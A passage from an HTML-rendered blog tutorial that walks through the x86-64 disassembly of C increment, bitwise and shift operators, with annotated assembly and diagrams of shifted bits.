</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="no">edx</span>     <span class="c1">; Store the EDX value in fourth variable (remainder)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">; epilogue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Another point worth mentioning is that <code>div</code> operations cannot be used without overwriting the contents of the <code>EAX</code> and <code>EDX</code> registers. If you want to use the values of these registers after the <code>div</code> operation, save them somewhere else where they can be read later.</p>
<h2 id="incrementdecrement-operators">Increment/Decrement operators</h2>
<p>That&rsquo;s all there is to arithmetic operators. Let&rsquo;s move on to the increment and decrement operators&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">A</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">B</span> <span class="o">=</span> <span class="n">A</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">C</span> <span class="o">=</span> <span class="o">++</span><span class="n">A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int A = 5;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int B = A++;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; load the value from variable A in EAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">lea</span>     <span class="no">edx</span><span class="p">,</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">1</span><span class="p">]</span>                <span class="c1">; increment the value and store it in EDX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edx</span>      <span class="c1">; update the incremented value in the variable A
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">eax</span>      <span class="c1">; Load the old EAX value in variable B;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">; int C = ++A;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">add</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>        <span class="c1">; Increment the value of variable A
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; Load the updated value of variable A in EAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>     <span class="c1">; Store the EAX value in variable C
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">; epilogue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>At this level, I believe you can see that this operator is nothing special. I&rsquo;ll leave the decrement operator upto you to test and disect. You can always use <a href="https://godbolt.org/">godbolt.org</a> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> for quick testing.</p>
<h2 id="bitwise-operators">Bitwise operators</h2>
<p>We can now proceed to examine the bitwise operators from a low-level perspective.
(PS: They are my personal favourites)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">A</span> <span class="o">=</span> <span class="mi">5</span><span class="p">,</span> <span class="n">B</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">C1</span> <span class="o">=</span> <span class="n">A</span> <span class="o">&amp;</span> <span class="n">B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">C2</span> <span class="o">=</span> <span class="n">A</span> <span class="o">|</span> <span class="n">B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">C3</span> <span class="o">=</span> <span class="n">A</span> <span class="o">^</span> <span class="n">B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">C4</span> <span class="o">=</span> <span class="o">~</span> <span class="n">B</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int A = 5, B = 0;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int C1 = A &amp; B;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">and</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int C1 = A | B;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">or</span>      <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int C1 = A ^ B;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">xor</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-20</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int C1 = ~ B;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">not</span>     <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-24</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; epilogue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Simple and neat. Aren&rsquo;t they? Load the variables in registers, perform the operation, store the result.</p>
<h3 id="shift-rightleft-operators">shift right/left operators</h3>
<p>Then there are shift operators - shift left and shift right.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">A</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">B</span> <span class="o">=</span> <span class="n">A</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">C</span> <span class="o">=</span> <span class="n">B</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; int A = 1;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int B = A &lt;&lt; 4;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sal</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">4</span>                  <span class="c1">; Shift arithmetic left
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; int C = B &gt;&gt; 4;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sar</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">4</span>                  <span class="c1">; Shift arithmetic right
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; epilogue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>If you look at their binary representation, shift operators are very straightforward. Allow me to create an image for you.</p>
<ul>
<li>Initial value in memory</li>
</ul>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 272 89"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>V</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<ul>
<li>After shifting left 4 times.</li>
</ul>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 280 153"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='16' y='68' fill='currentColor' style='font-size:1em'>V</text>
<text text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='24' y='68' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='32' y='68' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='40' y='68' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='48' y='68' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='64' y='68' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='72' y='68' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='152' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='216' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='248' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>─</text>
</g>

    </svg>
  
</div>
<p>Blocks with &ldquo;.&rdquo; are the freshly shifted block from outside the memory frame. These blocks are packed with zeroes. This makes our resulting value <code>2^4 = 16</code>.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 272 89"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>V</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>l</text>
